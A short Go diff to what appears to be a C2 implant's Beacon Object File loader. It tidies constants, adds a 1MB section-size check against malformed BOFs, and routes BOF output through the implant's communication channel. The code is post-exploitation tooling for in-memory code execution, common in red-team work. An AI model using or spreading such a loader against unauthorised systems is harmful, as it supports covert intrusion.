@@ -270,8 +270,8 @@ var (
 )
 
 const (
-	bofTokenQuery       = 0x0008
-	bofTokenElevation   = 20 // TokenElevation
+	bofTokenQuery     = 0x0008
+	bofTokenElevation = 20 // TokenElevation
 )
 
 // beaconIsAdminCb BeaconIsAdmin 回调：检查当前进程 token 是否提升
@@ -499,6 +499,11 @@ func ExecuteBof(coffBytes []byte, args string) ([]byte, error) {
 		if rawOffset+int(secSize) > len(coffBytes) {
 			continue
 		}
+		// 单个 section 超过 1MB 会让下面的定长数组拷贝直接 panic；
+		// 畸形/超大 BOF 直接拒绝，不允许打崩 dispatch。
+		if secSize > 1<<20 {
+			return nil, fmt.Errorf("BOF section %d too large: %d bytes (max 1MB)", i, secSize)
+		}
 		secInfos[i].allocBase = memory + currentOffset
 		secInfos[i].rawData = coffBytes[rawOffset : rawOffset+int(secSize)]
 		copy((*[1 << 20]byte)(unsafe.Pointer(secInfos[i].allocBase))[:secSize], secInfos[i].rawData)
@@ -571,7 +576,7 @@ func ExecuteBof(coffBytes []byte, args string) ([]byte, error) {
 	// 发送输出
 	output := bofOutput.String()
 	if len(output) > 0 {
-		communication.DataProcess(0, []byte(output))
+		communication.ExecOutput([]byte(output))
 	}
 
 	return []byte(fmt.Sprintf("BOF executed, output: %d bytes", len(output))), nil
